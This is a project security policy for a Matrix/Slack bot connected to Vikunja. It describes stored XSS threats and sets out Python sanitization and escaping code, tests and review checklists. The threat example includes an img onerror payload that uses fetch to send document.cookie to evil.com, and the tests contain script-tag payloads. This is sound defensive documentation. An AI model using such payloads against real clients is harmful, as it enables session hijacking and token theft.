# Security Policy

## Architecture Decision: Vikunja to Go Model

### The Fundamental Problem

**Bot with persistent API access to all users' Vikunja instances creates an unsolvable trust boundary at scale.**

Even with perfect input sanitization and output escaping, the architecture has inherent risks:
- Bot compromise → All connected Vikunja instances exposed
- Zero-day exploits in sanitization logic
- Insider threat (bot operator has access to all user data)
- Compliance issues (bot processes user's production data)

### The Solution: Ephemeral Bot Access

**"Vikunja to Go" model**: Bot assists with instance creation, then hands off credentials and DELETES its own access.

```
Phase 1: Bot-Assisted Setup (Trusted)
  User → Matrix Bot → Creates Vikunja instance
                   → Helps populate initial data
                   → User reviews and approves

Phase 2: Handoff (Trust Boundary)
  Bot → Generates user credentials
      → REVOKES its own API token
      → Provides MCP server installation guide

Phase 3: User Self-Hosted (Bot never sees this)
  User's local MCP ↔ User's Vikunja instance
```

**Security benefits**:
- Blast radius = 1 (bot compromise doesn't expose existing users)
- Zero persistent access (bot credentials are ephemeral)
- User controls trust boundary (decides when to graduate)
- Compliance-friendly (bot never processes real work data)

**Status**: Architectural proposal (solutions-ih53). Current implementation uses persistent access model with defense-in-depth.

---

## Current Implementation: Defense in Depth

Until "Vikunja to Go" is implemented, we use multiple security layers:

### Core Assumption: All Vikunja Data is Untrusted

**Users have direct access to Vikunja web UI** and can inject arbitrary content into any text field (task titles, descriptions, project names, labels, etc.). This creates a **second-order injection threat**:

1. Attacker creates malicious content in Vikunja web UI
2. Bot retrieves this data via Vikunja API
3. Bot displays data to victim via Matrix/Slack
4. If not properly escaped, malicious content executes in victim's client

**Example Attack**:
```
1. Attacker creates task in Vikunja:
   Title: "<script>alert(document.cookie)</script>"
   Description: "<img src=x onerror='fetch(\"https://evil.com?c=\"+document.cookie)'>"

2. Victim asks bot: "show my tasks"
   → Bot retrieves malicious HTML from Vikunja
   → Bot sends to Matrix/Slack

3. Without proper escaping:
   → XSS executes in victim's browser
   → Session hijacking, token theft, account takeover
```

## Security Requirements

### 1. Input Sanitization (Defense Layer 1)

**All user input must be sanitized before sending to Vikunja API.**

#### Title Sanitization

Titles (tasks, projects, labels) must have HTML tags stripped:

```python
def _sanitize_title(title: str) -> str:
    """Strip HTML tags from title, keeping only plain text."""
    if not title:
        return title
    # Remove script/style tags AND their content (security-critical)
    title = re.sub(r'<(script|style)[^>]*>.*?</\1>', '', title, flags=re.IGNORECASE | re.DOTALL)
    # Remove all other HTML tags (keep content)
    title = re.sub(r'<[^>]+>', '', title)
    # Limit length
    return title[:256]
```

**Applied to**:
- `_create_task_impl()` - line 1768
- `_update_task_impl()` - line 1795
- `_create_project_impl()` - line 1597
- `_update_project_impl()` - line 1621
- `_create_label_impl()` - line 2241

#### Description Sanitization

Descriptions must have HTML entities escaped before markdown conversion:

```python
def _sanitize_description(desc: str) -> str:
    """Escape HTML entities in description before markdown conversion."""
    if not desc:
        return desc
    import html
    return html.escape(desc)
```

**Applied to**:
- `_create_task_impl()` - line 1770
- `_update_task_impl()` - line 1797

**Flow**: User input → `_sanitize_description()` → `md_to_html()` → Vikunja API

### 2. Output Escaping (Defense Layer 2)

**All responses to Matrix/Slack must escape HTML entities.**

#### Matrix Bot

ALL Matrix responses go through `_markdown_to_html()` which escapes HTML FIRST:

```python
def _markdown_to_html(self, text: str) -> str:
    """Convert markdown to HTML for Matrix formatted messages."""
    if not text:
        return text
    
    # Escape HTML entities FIRST (before any markdown processing)
    html = text.replace("&", "&amp;")  # Must be first
    html = html.replace("<", "&lt;")
    html = html.replace(">", "&gt;")
    
    # Then process markdown...
    return html
```

**Location**: `src/vikunja_mcp/matrix_client.py` line 409-413

**Critical**: Escaping happens BEFORE markdown processing, preventing bypass.

#### Slack Bot

Slack uses mrkdwn format (not HTML), so XSS risk is lower. However, still escape special characters in user-generated content.

### 3. No Bypass Paths

**Every code path that displays Vikunja data MUST go through sanitization/escaping.**

**Verification checklist**:
- [ ] All task creation/update functions use `_sanitize_title()` and `_sanitize_description()`
- [ ] All Matrix responses use `_markdown_to_html()`
- [ ] No direct string concatenation of Vikunja data into HTML
- [ ] LLM-generated responses also go through `_markdown_to_html()`
- [ ] Error messages don't leak unsanitized data

## Testing Requirements

### Unit Tests

Test sanitization functions with XSS payloads:

```python
def test_sanitize_title():
    assert _sanitize_title("<script>alert(1)</script>Test") == "Test"
    assert _sanitize_title("<b>Bold</b>") == "Bold"
    assert _sanitize_title("<style>body{color:red}</style>Title") == "Title"

def test_sanitize_description():
    assert _sanitize_description("<script>alert(1)</script>") == "&lt;script&gt;alert(1)&lt;/script&gt;"
    assert _sanitize_description("**Bold** <b>HTML</b>") == "**Bold** &lt;b&gt;HTML&lt;/b&gt;"
```

### Integration Tests

Test end-to-end HTML escaping in Matrix bot responses:

**File**: `tests/integration/test_html_escaping.py`

**Test cases**:
1. Task with `<script>` in description → escaped in response
2. Task with `<img onerror>` in title → stripped before storage
3. Project with `<iframe>` in name → stripped before storage
4. LLM response mentioning HTML tags → escaped in Matrix message

### Manual Testing

1. Create task in Vikunja web UI with malicious HTML
2. Ask bot to show the task
3. Inspect Matrix message source (formatted_body)
4. Verify HTML is escaped: `&lt;script&gt;` not `<script>`

## Code Review Checklist

When reviewing code changes:

- [ ] **New tool functions**: Do they accept user input? Is it sanitized?
- [ ] **New response formatting**: Does it go through `_markdown_to_html()`?
- [ ] **Direct API calls**: Are title/description parameters sanitized?
- [ ] **Error messages**: Do they include user input? Is it escaped?
- [ ] **LLM prompts**: Do they include Vikunja data? Treat as untrusted.

## Related Documentation

- `docs/SECURITY-ANALYSIS.md` - Comprehensive security analysis with attack scenarios
- `tests/integration/test_html_escaping.py` - Integration tests for HTML injection protection
- `src/vikunja_mcp/matrix_client.py` - Matrix bot HTML escaping implementation

## Incident Response

If HTML injection vulnerability is discovered:

1. **Assess impact**: Can attacker execute JavaScript? Steal tokens?
2. **Immediate mitigation**: Add escaping at output layer (Matrix bot)
3. **Root cause fix**: Add sanitization at input layer (tool functions)
4. **Verify fix**: Run integration tests, manual testing
5. **Deploy**: Push to production immediately
6. **Notify users**: If tokens may have been compromised

## Security Contact

Report security vulnerabilities to: [Your contact method]

**Do not** create public GitHub issues for security vulnerabilities.

